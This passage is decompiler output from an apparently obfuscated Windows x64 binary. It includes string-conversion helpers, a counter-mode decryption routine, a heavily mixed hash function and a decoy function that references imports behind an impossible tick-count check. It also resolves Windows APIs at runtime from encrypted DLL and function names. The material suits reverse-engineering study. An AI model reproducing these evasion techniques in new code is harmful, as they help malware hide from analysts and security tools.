      bstrString = SysAllocString(psz);
      FUN_140009264((undefined8 *)&DAT_1400172b0,psz,uVar1);
      local_44 = (LONG)lVar3;
      SafeArrayPutElement(psa,&local_44,bstrString);
      SysFreeString(bstrString);
      puVar2 = puVar2 + 2;
    }
  }
  return psa;
}


// ==== FUN_14000921a @ 14000921a size 74

BSTR FUN_14000921a(undefined1 (*param_1) [16],ulonglong param_2)

{
  OLECHAR *psz;
  BSTR pOVar1;
  
  psz = (OLECHAR *)FUN_140009294(param_1,param_2);
  if (psz == (OLECHAR *)0x0) {
    pOVar1 = (BSTR)0x0;
  }
  else {
    pOVar1 = SysAllocString(psz);
    FUN_140009264((undefined8 *)&DAT_1400172b0,psz,param_2);
  }
  return pOVar1;
}


// ==== FUN_140009264 @ 140009264 size 48

void FUN_140009264(undefined8 *param_1,undefined8 param_2,longlong param_3)

{
  (**(code **)(param_1[1] + 0x18))(*param_1,param_2,param_3 * 2 + 2,1);
  return;
}


// ==== FUN_140009294 @ 140009294 size 57

longlong FUN_140009294(undefined1 (*param_1) [16],ulonglong param_2)

{
  longlong local_28 [2];
  short local_18;
  
  FUN_1400093d9(local_28,param_1,param_2);
  if (local_18 != 0) {
    local_28[0] = 0;
  }
  return local_28[0];
}


// ==== FUN_1400092cd @ 1400092cd size 268

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400092cd(undefined8 *param_1,undefined1 (*param_2) [16],ulonglong param_3)

{
  undefined1 auVar1 [16];
  byte bVar2;
  char cVar3;
  undefined8 uVar4;
  ulonglong uVar5;
  undefined1 (*pauVar6) [16];
  ulonglong uVar7;
  uint uVar8;
  ulonglong uStack_48;
  
  uVar4 = _UNK_14002d870;
  uVar5 = param_3;
  for (pauVar6 = param_2;
      (0xf < uVar5 &&
      (auVar1 = *pauVar6,
      (((((((((((((((SUB161(auVar1 >> 7,0) & 1) == 0 && (SUB161(auVar1 >> 0xf,0) & 1) == 0) &&
                  (SUB161(auVar1 >> 0x17,0) & 1) == 0) && (SUB161(auVar1 >> 0x1f,0) & 1) == 0) &&
                (SUB161(auVar1 >> 0x27,0) & 1) == 0) && (SUB161(auVar1 >> 0x2f,0) & 1) == 0) &&
              (SUB161(auVar1 >> 0x37,0) & 1) == 0) && (SUB161(auVar1 >> 0x3f,0) & 1) == 0) &&
            (SUB161(auVar1 >> 0x47,0) & 1) == 0) && (SUB161(auVar1 >> 0x4f,0) & 1) == 0) &&
          (SUB161(auVar1 >> 0x57,0) & 1) == 0) && (SUB161(auVar1 >> 0x5f,0) & 1) == 0) &&
        (SUB161(auVar1 >> 0x67,0) & 1) == 0) && (SUB161(auVar1 >> 0x6f,0) & 1) == 0) &&
      (SUB161(auVar1 >> 0x77,0) & 1) == 0) && -1 < auVar1[0xf])); pauVar6 = pauVar6 + 1) {
    uVar5 = uVar5 - 0x10;
  }
  uVar7 = 0;
  do {
    if (uVar5 <= uVar7) {
      *(undefined2 *)(param_1 + 2) = 0;
      *param_1 = param_2;
      param_1[1] = param_3;
      return;
    }
    uStack_48 = 1;
    if ((char)(*pauVar6)[uVar7] < '\0') {
      bVar2 = (&DAT_14002d8b4)[(byte)(*pauVar6)[uVar7]];
      if (bVar2 == 0xf1) {
LAB_1400093aa:
        *param_1 = _DAT_14002d868;
        param_1[1] = uVar4;
        param_1[2] = 0x10;
        return;
      }
      uVar8 = bVar2 & 7;
      uStack_48 = (ulonglong)uVar8;
      if (uVar5 < uVar7 + uStack_48) goto LAB_1400093aa;
      if (((byte)(*pauVar6)[uVar7 + 1] < (byte)(0x809080a080 >> (bVar2 >> 1 & 0x38))) ||
         ((byte)(0x8fbf9fbfbf >> (bVar2 >> 1 & 0x38)) < (byte)(*pauVar6)[uVar7 + 1]))
      goto LAB_1400093aa;
      if ((char)uVar8 != '\x02') {
        if (uVar8 == 4) {
          if (-0x41 < (char)(*pauVar6)[uVar7 + 2]) goto LAB_1400093aa;
          cVar3 = (*pauVar6)[uVar7 + 3];
          uStack_48 = 4;
        }
        else {
          cVar3 = (*pauVar6)[uVar7 + 2];
          uStack_48 = 3;
        }
        if (-0x41 < cVar3) goto LAB_1400093aa;
      }
    }
    uVar7 = uVar7 + uStack_48;
  } while( true );
}


// ==== FUN_1400093d9 @ 1400093d9 size 635

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong * FUN_1400093d9(longlong *param_1,undefined1 (*param_2) [16],ulonglong param_3)

{
  ulonglong uVar1;
  undefined1 auVar2 [15];
  undefined1 auVar3 [15];
  undefined1 auVar4 [15];
  undefined1 auVar5 [15];
  undefined1 auVar6 [15];
  undefined1 auVar7 [15];
  undefined1 auVar8 [15];
  undefined1 auVar9 [15];
  undefined1 auVar10 [15];
  uint uVar11;
  longlong lVar12;
  longlong lVar13;
  short sVar14;
  longlong lVar15;
  longlong lVar16;
  ulonglong uVar17;
  undefined1 auVar18 [16];
  longlong local_e0;
  ulonglong uStack_d8;
  short local_d0;
  longlong local_c8;
  undefined1 auStack_c0 [16];
  undefined8 uStack_b0;
  undefined8 uStack_a8;
  uint local_a0;
  char local_9c;
  longlong local_98;
  ulonglong uStack_90;
  longlong local_88;
  undefined8 uStack_80;
  undefined8 local_78;
  undefined1 local_61;
  undefined1 local_60;
  
  auStack_c0 = (undefined1  [16])0x0;
  local_c8 = 2;
  uStack_b0 = _DAT_1400172b0;
  uStack_a8 = _UNK_1400172b8;
  sVar14 = FUN_14000982f(&local_c8,param_3 + 1);
  if (sVar14 != 0) goto LAB_14000962a;
  local_78 = uStack_a8;
  local_88 = auStack_c0._8_8_;
  uStack_80 = uStack_b0;
  local_98 = local_c8;
  uVar17 = auStack_c0._0_8_;
  for (; 7 < param_3; param_3 = param_3 - 8) {
    uVar1 = *(ulonglong *)*param_2;
    if ((((((((uVar1 >> 7 & 1) != 0 || (uVar1 >> 0xf & 1) != 0) || (uVar1 >> 0x17 & 1) != 0) ||
           (uVar1 >> 0x1f & 1) != 0) || (uVar1 >> 0x27 & 1) != 0) || (uVar1 >> 0x2f & 1) != 0) ||
        (uVar1 >> 0x37 & 1) != 0) || (uVar1 & 0x8000000000000000) != 0) break;
    auVar2._8_6_ = 0;
    auVar2._0_8_ = uVar1;
    auVar2[0xe] = (char)(uVar1 >> 0x38);
    auVar3._8_4_ = 0;
    auVar3._0_8_ = uVar1;
    auVar3[0xc] = (char)(uVar1 >> 0x30);
    auVar3._13_2_ = auVar2._13_2_;
    auVar4._8_4_ = 0;
    auVar4._0_8_ = uVar1;
    auVar4._12_3_ = auVar3._12_3_;
    auVar5._8_2_ = 0;
    auVar5._0_8_ = uVar1;
    auVar5[10] = (char)(uVar1 >> 0x28);
    auVar5._11_4_ = auVar4._11_4_;
    auVar6._8_2_ = 0;
    auVar6._0_8_ = uVar1;
    auVar6._10_5_ = auVar5._10_5_;
    auVar7[8] = (char)(uVar1 >> 0x20);
    auVar7._0_8_ = uVar1;
    auVar7._9_6_ = auVar6._9_6_;
    auVar8._7_8_ = 0;
    auVar8._0_7_ = auVar7._8_7_;
    auVar9._1_8_ = SUB158(auVar8 << 0x40,7);
    auVar9[0] = (char)(uVar1 >> 0x18);
    auVar9._9_6_ = 0;
    auVar10._1_10_ = SUB1510(auVar9 << 0x30,5);
    auVar10[0] = (char)(uVar1 >> 0x10);
    auVar10._11_4_ = 0;
    auVar18._3_12_ = SUB1512(auVar10 << 0x20,3);
    auVar18[2] = (char)(uVar1 >> 8);
    auVar18[0] = (byte)uVar1;
    auVar18[1] = 0;
    auVar18[0xf] = 0;
    *(undefined1 (*) [16])(local_c8 + uVar17 * 2) = auVar18;
    uVar17 = uVar17 + 8;
    param_2 = (undefined1 (*) [16])(*param_2 + 8);
  }
  uStack_90 = uVar17;
  FUN_1400092cd(&local_e0,param_2,param_3);
  sVar14 = local_d0;
  if (local_d0 == 0) {
    local_c8 = local_e0;
    auStack_c0._8_8_ = 0;
    auStack_c0._0_8_ = uStack_d8;
    while (FUN_140009944(&local_a0,&local_c8), uVar11 = local_a0, local_9c != '\0') {
      if ((local_a0 & 0x1f0000) == 0) {
        sVar14 = FUN_14000991c(&local_98,uVar17 + 1);
        if (sVar14 != 0) goto LAB_1400095d0;
        uVar17 = uStack_90 + 1;
        *(short *)(local_98 + uStack_90 * 2) = (short)uVar11;
        uStack_90 = uVar17;
      }
      else {
        local_61 = 0xfffffffffffffffd < uVar17;
        local_60 = local_61;
        if ((bool)local_61) {
          sVar14 = 1;
          goto LAB_1400095d0;
        }
        sVar14 = FUN_14000991c(&local_98,uVar17 + 2);
        if (sVar14 != 0) goto LAB_1400095d0;
        uVar17 = uStack_90 + 2;
        *(uint *)(local_98 + uStack_90 * 2) =
             (uVar11 + 0x1f0000 >> 10 & 0x7ff) + (uVar11 & 0x3ff) * 0x10000 + -0x23ff2800;
        uStack_90 = uVar17;
      }
    }
    sVar14 = FUN_14000982f(&local_98,uVar17 + 1);
    lVar13 = local_88;
    lVar12 = local_98;
    if (sVar14 == 0) {
      uVar17 = uStack_90 + 1;
      *(undefined2 *)(local_98 + uStack_90 * 2) = 0;
      lVar16 = local_98;
      uStack_90 = uVar17;
      lVar15 = FUN_1400097a8(&uStack_80,local_98,local_88,uVar17);
      if (lVar15 == 0) {
        FUN_14000968f(&local_c8,&uStack_80,uVar17);
        lVar15 = local_c8;
        sVar14 = auStack_c0._8_2_;
        if (auStack_c0._8_2_ != 0) goto LAB_1400095d0;
        lVar16 = auStack_c0._0_8_;
        FUN_14000d5a5(local_c8,lVar12,auStack_c0._0_8_ * 2);
        FUN_1400096fd(&uStack_80,lVar12,lVar13);
      }
      *param_1 = lVar15;
      param_1[1] = lVar16 + -1;
      sVar14 = 0;
      goto LAB_14000962a;
    }
  }
LAB_1400095d0:
  FUN_1400098f4(&local_98);
LAB_14000962a:
  *(short *)(param_1 + 2) = sVar14;
  return param_1;
}


// ==== FUN_140009654 @ 140009654 size 59

void FUN_140009654(undefined8 *param_1,longlong param_2)

{
  longlong lVar1;
  undefined8 local_18;
  undefined8 uStack_10;
  
  for (lVar1 = 0; lVar1 != 0x10; lVar1 = lVar1 + 1) {
    *(byte *)((longlong)&local_18 + lVar1) = (&DAT_14002d880)[lVar1] ^ *(byte *)(param_2 + lVar1);
  }
  *param_1 = local_18;
  param_1[1] = uStack_10;
  return;
}


// ==== FUN_14000968f @ 14000968f size 110

longlong * FUN_14000968f(longlong *param_1,undefined8 *param_2,longlong param_3)

{
  longlong lVar1;
  longlong *plVar2;
  longlong local_78;
  longlong lStack_70;
  undefined2 local_68;
  longlong local_60 [2];
  short local_50;
  undefined8 local_48;
  undefined8 uStack_40;
  longlong local_30;
  short local_28;
  
  local_48 = *param_2;
  uStack_40 = param_2[1];
  FUN_140009730(&local_30,&local_48,param_3);
  if (local_28 == 0) {
    plVar2 = &local_78;
    local_68 = 0;
    local_78 = local_30;
    lStack_70 = param_3;
  }
  else {
    plVar2 = local_60;
    local_50 = local_28;
  }
  param_1[2] = plVar2[2];
  lVar1 = plVar2[1];
  *param_1 = *plVar2;
  param_1[1] = lVar1;
  return param_1;
}


// ==== FUN_1400096fd @ 1400096fd size 51

void FUN_1400096fd(undefined8 *param_1,undefined8 param_2,longlong param_3)

{
  if (param_3 != 0) {
    (**(code **)(param_1[1] + 0x18))(*param_1,param_2,param_3 * 2,1);
  }
  return;
}


// ==== FUN_140009730 @ 140009730 size 120

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong * FUN_140009730(longlong *param_1,undefined8 *param_2,longlong param_3)

{
  longlong lVar1;
  undefined2 uVar2;
  undefined4 local_20;
  undefined2 local_1c;
  
  lVar1 = _UNK_14002dda8;
  if (param_3 < 0) {
    *param_1 = _DAT_14002dda0;
    param_1[1] = lVar1;
    return param_1;
  }
  lVar1 = param_3 * 2;
  if (lVar1 == 0) {
    local_1c = 0;
    local_20 = 0;
    lVar1 = -2;
  }
  else {
    lVar1 = (**(code **)param_2[1])(*param_2,lVar1,CONCAT71((int7)((ulonglong)lVar1 >> 8),1));
    if (lVar1 == 0) {
      local_1c = 0;
      local_20 = 0;
      uVar2 = 1;
      goto LAB_140009789;
    }
  }
  uVar2 = 0;
LAB_140009789:
  *param_1 = lVar1;
  *(undefined2 *)(param_1 + 1) = uVar2;
  *(undefined4 *)((longlong)param_1 + 10) = local_20;
  *(undefined2 *)((longlong)param_1 + 0xe) = local_1c;
  return param_1;
}


// ==== FUN_1400097a8 @ 1400097a8 size 135

longlong FUN_1400097a8(undefined8 *param_1,longlong param_2,longlong param_3,longlong param_4)

{
  undefined8 local_30;
  longlong local_28;
  undefined1 local_20;
  
  local_30 = *param_1;
  local_28 = param_1[1];
  if (param_4 == 0) {
    FUN_1400096fd(&local_30,param_2,param_3);
  }
  else if (((param_3 == 0) || (local_20 = param_4 < 0, (bool)local_20)) ||
          (param_2 = (**(code **)(local_28 + 0x10))(local_30,param_2,param_3 * 2,1,param_4 * 2),
          param_2 == 0)) {
    param_2 = 0;
  }
  return param_2;
}


// ==== FUN_14000982f @ 14000982f size 197

short FUN_14000982f(longlong *param_1,ulonglong param_2)

{
  ulonglong uVar1;
  longlong lVar2;
  longlong lVar3;
  longlong lVar4;
  longlong local_88;
  longlong lStack_80;
  longlong local_78;
  longlong lStack_70;
  longlong local_68;
  longlong lStack_60;
  longlong local_58;
  longlong local_50;
  short local_48;
  
  uVar1 = param_1[2];
  if (uVar1 < param_2) {
    lVar2 = *param_1;
    local_68 = param_1[3];
    lStack_60 = param_1[4];
    lVar4 = lVar2;
    lVar3 = FUN_1400097a8(&local_68,lVar2,uVar1,param_2);
    if (lVar3 == 0) {
      local_78 = param_1[3];
      lStack_70 = param_1[4];
      FUN_14000968f(&local_58,&local_78,param_2);
      if (local_48 != 0) {
        return local_48;
      }
      FUN_14000d5a5(local_58,*param_1,param_1[1] * 2);
      local_88 = param_1[3];
      lStack_80 = param_1[4];
      FUN_1400096fd(&local_88,lVar2,uVar1);
      lVar3 = local_58;
      lVar4 = local_50;
    }
    *param_1 = lVar3;
    param_1[2] = lVar4;
  }
  return 0;
}


// ==== FUN_1400098f4 @ 1400098f4 size 40

void FUN_1400098f4(undefined8 *param_1)

{
  undefined8 local_18;
  undefined8 uStack_10;
  
  local_18 = param_1[3];
  uStack_10 = param_1[4];
  FUN_1400096fd(&local_18,*param_1,param_1[2]);
  return;
}


// ==== FUN_14000991c @ 14000991c size 40

short FUN_14000991c(longlong *param_1,ulonglong param_2)

{
  short sVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  
  if ((ulonglong)param_1[2] < param_2) {
    uVar2 = (param_2 >> 1) + 0x40;
    uVar3 = 0xffffffffffffffff;
    if (!CARRY8(uVar2,param_2)) {
      uVar3 = uVar2 + param_2;
    }
    sVar1 = FUN_14000982f(param_1,uVar3);
    return sVar1;
  }
  return 0;
}


// ==== FUN_140009944 @ 140009944 size 181
// decompile failed: 
Low-level Error: Backward normalization not implemented
// ==== FUN_140009ca4 @ 140009ca4 size 308

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140009ca4(longlong param_1,longlong param_2,ulonglong param_3)

{
  char *pcVar1;
  ulonglong uVar2;
  longlong lVar3;
  ulonglong uVar4;
  undefined1 *puVar5;
  uint *puVar6;
  uint *puVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  bool bVar10;
  uint local_248 [60];
  uint local_158 [60];
  byte local_68 [16];
  undefined8 local_58;
  undefined8 uStack_50;
  longlong local_48;
  
  if (DAT_140034690 == '\0') {
    FUN_140006155(local_248,(uint *)&DAT_140017388);
    puVar6 = local_248;
    puVar5 = &DAT_1400345a0;
    for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
      *puVar5 = (char)*puVar6;
      puVar6 = (uint *)((longlong)puVar6 + 1);
      puVar5 = puVar5 + 1;
    }
    DAT_140034690 = '\x01';
  }
  else {
    puVar5 = &DAT_1400345a0;
    puVar6 = local_248;
    for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined1 *)puVar6 = *puVar5;
      puVar5 = puVar5 + 1;
      puVar6 = (uint *)((longlong)puVar6 + 1);
    }
  }
  puVar6 = local_248;
  puVar7 = local_158;
  for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(char *)puVar7 = (char)*puVar6;
    puVar6 = (uint *)((longlong)puVar6 + 1);
    puVar7 = (uint *)((longlong)puVar7 + 1);
  }
  local_58 = _DAT_1400173a8;
  uStack_50 = _UNK_1400173b0;
  uVar8 = 0;
  uVar4 = param_3;
  local_48 = param_1;
  do {
    uVar9 = 0x10;
    if (uVar4 < 0x10) {
      uVar9 = uVar4;
    }
    if (param_3 <= uVar8) {
      *(undefined1 *)(local_48 + param_3) = 0;
      return;
    }
    FUN_1400058a8(local_158,(undefined8 *)local_68,(uint *)&local_58);
    lVar3 = 0xf;
    do {
      pcVar1 = (char *)((longlong)&local_58 + lVar3);
      *pcVar1 = *pcVar1 + '\x01';
      bVar10 = lVar3 == 0;
      lVar3 = lVar3 + -1;
      if (bVar10) break;
    } while (*pcVar1 == '\0');
    for (uVar2 = 0; uVar9 != uVar2; uVar2 = uVar2 + 1) {
      *(byte *)(param_1 + uVar2) = local_68[uVar2] ^ *(byte *)(param_2 + uVar2);
    }
    uVar8 = uVar8 + 0x10;
    uVar4 = uVar4 - 0x10;
    param_2 = param_2 + 0x10;
    param_1 = param_1 + 0x10;
  } while( true );
}


// ==== FUN_140009dd8 @ 140009dd8 size 723

uint FUN_140009dd8(uint param_1)

{
  uint uVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  bool bVar7;
  
  for (lVar2 = 0; lVar2 != 0x1a8; lVar2 = lVar2 + 1) {
    param_1 = param_1 ^ (byte)(&DAT_14002da47)[lVar2];
  }
  for (lVar2 = 0; lVar2 != 0x53; lVar2 = lVar2 + 1) {
    param_1 = param_1 - (byte)(&DAT_14002dbef)[lVar2];
  }
  iVar5 = 3;
  uVar1 = param_1;
  while (bVar7 = iVar5 != 0, iVar5 = iVar5 + -1, bVar7) {
    uVar1 = uVar1 ^ uVar1 * 0x22dbc072 + 0x88;
  }
  uVar3 = uVar1 * param_1 ^ 0x8183b10d;
  uVar3 = (uVar3 << 10 | uVar3 >> 0x16) * 0x6b9e1075;
  uVar1 = uVar1 * param_1 + (uVar3 >> 0x15 ^ uVar3) + 0x5bea3e21;
  uVar3 = (uVar1 ^ 0x63327242) + 0x915b6661;
  uVar3 = uVar1 * 8 ^ uVar1 ^ (uVar3 * 0x1000000 | uVar3 >> 8);
  uVar1 = uVar3 * -0x1151a2da + 0xa5206569;
  uVar1 = uVar1 >> 0x13 ^ uVar1;
  uVar3 = uVar3 - ((uVar1 & 1) - 1 ^ uVar1);
  uVar1 = uVar3 * -0x6590e2ea + 0x11b ^ uVar3;
  uVar3 = (uVar1 * -0x6590e2ea + 0x11b ^ uVar1) * uVar3;
  uVar1 = (uVar3 ^ 0xef480fc7) + 0xbacad3c8;
  uVar3 = uVar3 - (uVar3 * 8 ^ (uVar1 * 0x1000 | uVar1 >> 0x14));
  uVar1 = uVar3 ^ 0x94cce7ad;
  uVar1 = (uVar1 << 10 | uVar1 >> 0x16) * -0x10d13dee;
  uVar3 = ((uVar1 >> 0x10 ^ uVar1) + 0xbd57e425) * uVar3;
  iVar5 = 5;
  uVar1 = uVar3;
  while (bVar7 = iVar5 != 0, iVar5 = iVar5 + -1, bVar7) {
    uVar1 = uVar1 ^ uVar1 * 0x3512dde7 + 0x12a;
  }
  uVar1 = uVar1 + uVar3;
  uVar3 = ((uVar1 ^ 0x78b8150) >> 4) * 0x4b6c5cc0;
  uVar3 = uVar3 >> 0xc ^ uVar3;
  uVar4 = uVar3 + uVar1 + 0x4892a1fc;
  uVar6 = (uVar4 ^ 0x68728b85) + 0xc23f3ce2;
  iVar5 = uVar1 + uVar3 + (uVar4 * 8 ^ (uVar6 * 0x100 | uVar6 >> 0x18)) + 0x4892a1fc;
  uVar1 = iVar5 * 0x74423c64 + 0x4bb7009a;
  uVar4 = (uVar1 >> 0x1a ^ uVar1 ^ ((uVar1 >> 0x1a & 1) != 0) - 1) * iVar5;
  uVar1 = ((uVar4 ^ 0x3a51ef43) << 1 | (uint)((int)(uVar4 ^ 0x3a51ef43) < 0)) * -0x38e1749a;
  uVar1 = uVar1 >> 0x1a ^ uVar1;
  uVar3 = (uVar4 + uVar1) * 0x51451665 + 0xe9694616;
  uVar3 = uVar3 >> 0x1d ^ uVar3;
  uVar3 = (uVar4 + uVar1 + -0x5a5f855b) - ((uVar3 & 1) - 1 ^ uVar3);
  uVar1 = uVar3 ^ 0x6b0f6e29;
  uVar1 = (uVar1 << 0x11 | uVar1 >> 0xf) * 0x21e5162f;
  uVar3 = (uVar1 >> 0x1e ^ uVar1) + 0x858b398d ^ uVar3;
  iVar5 = 7;
  uVar1 = uVar3;
  while (bVar7 = iVar5 != 0, iVar5 = iVar5 + -1, bVar7) {
    uVar1 = uVar1 ^ uVar1 * -0x542510fe + 0x2b8;
  }
  uVar1 = uVar1 * uVar3;
  uVar3 = uVar1 * -0x78e7dc0d + 0x3bd ^ uVar1;
  uVar1 = (uVar3 * -0x78e7dc0d + 0x3bd ^ uVar3) + uVar1;
  uVar3 = ((uVar1 ^ 0x8eef4013) << 0x14 | (uVar1 ^ 0x8eef4013) >> 0xc) * 0x160eb9c0;
  uVar3 = uVar3 >> 9 ^ uVar3;
  uVar4 = (uVar1 + uVar3) * -0xc45dfae + 0x1630dea;
  uVar3 = uVar4 ^ uVar3 + uVar1 + 0x1af8f8da ^ uVar4 >> 0x10 ^ ((uVar4 >> 0x10 & 1) != 0) - 1;
  iVar5 = 4;
  uVar1 = uVar3;
  while (bVar7 = iVar5 != 0, iVar5 = iVar5 + -1, bVar7) {
    uVar1 = uVar1 ^ uVar1 * 0x141bbee9 + 0x231;
  }
  iVar5 = uVar1 * uVar3;
  uVar1 = iVar5 * -0x3b9a1684 + 0x601680df;
  uVar1 = uVar1 >> 7 ^ uVar1;
  uVar1 = ((uVar1 & 1) - 1 ^ uVar1) * iVar5;
  iVar5 = 7;
  while (bVar7 = iVar5 != 0, iVar5 = iVar5 + -1, bVar7) {
    uVar1 = uVar1 ^ uVar1 * -0x39c5acd8 + 0x2e2;
  }
  return uVar1;
}


// ==== FUN_14000a0ab @ 14000a0ab size 109

void FUN_14000a0ab(void)

{
  DWORD DVar1;
  
  DVar1 = GetTickCount();
  if (DVar1 == 0xc8f8c779) {
    SysAllocString((OLECHAR *)0x0);
    BitBlt((HDC)0x0,0,0,0,0,(HDC)0x0,0,0,0);
    WSAStartup(0,(LPWSADATA)0x0);
    GetFileVersionInfoSizeA((LPCSTR)0x0,(LPDWORD)0x0);
    EnumWindows((WNDENUMPROC)0x0,0);
    return;
  }
  return;
}


// ==== FUN_14000a118 @ 14000a118 size 3133

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000a118(void)

{
  LPCSTR pCVar1;
  HMODULE pHVar2;
  undefined1 local_d8 [128];
  undefined1 local_58 [64];
  
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x14002dc42,0xb);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dc4d,0xd);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034248 = (FARPROC)0x0;
  }
  else {
    DAT_140034248 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x14002dc42,0xb);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dc5a,0xd);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034250 = (FARPROC)0x0;
  }
  else {
    DAT_140034250 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x14002dc42,0xb);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dc67,0xf);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034258 = (FARPROC)0x0;
  }
  else {
    DAT_140034258 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x14002dc42,0xb);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dc76,10);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034260 = (FARPROC)0x0;
  }
  else {
    DAT_140034260 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x14002dc42,0xb);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dc80,0x11);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034268 = (FARPROC)0x0;
  }
  else {
    DAT_140034268 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x14002dc42,0xb);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dc91,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034270 = (FARPROC)0x0;
  }
  else {
    DAT_140034270 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x14002dc42,0xb);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dc9f,0x12);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034278 = (FARPROC)0x0;
  }
  else {
    DAT_140034278 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x14002dc42,0xb);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14002dcb1,0xb);
  if (pHVar2 == (HMODULE)0x0) {
    DAT_140034280 = (FARPROC)0x0;
  }
  else {
    DAT_140034280 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14001954d,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_140034288 = (FARPROC)0x0;
  }
  else {
    _DAT_140034288 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x14001955b,0xe);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_140034290 = (FARPROC)0x0;
  }
  else {
    _DAT_140034290 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x140019569,0xc);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_140034298 = (FARPROC)0x0;
  }
  else {
    _DAT_140034298 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x140019575,0xd);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_1400342a0 = (FARPROC)0x0;
  }
  else {
    _DAT_1400342a0 = GetProcAddress(pHVar2,pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_58,0x140019541,0xc);
  pHVar2 = GetModuleHandleA(pCVar1);
  if (pHVar2 == (HMODULE)0x0) {
    pHVar2 = LoadLibraryA(pCVar1);
  }
  pCVar1 = (LPCSTR)FUN_14000ae64((longlong)local_d8,0x140019582,0x12);
  if (pHVar2 == (HMODULE)0x0) {
    _DAT_1400342a8 = (FARPROC)0x0;
  }
  else {
    _DAT_1400342a8 = GetProcAddress(pHVar2,pCVar1);
  }
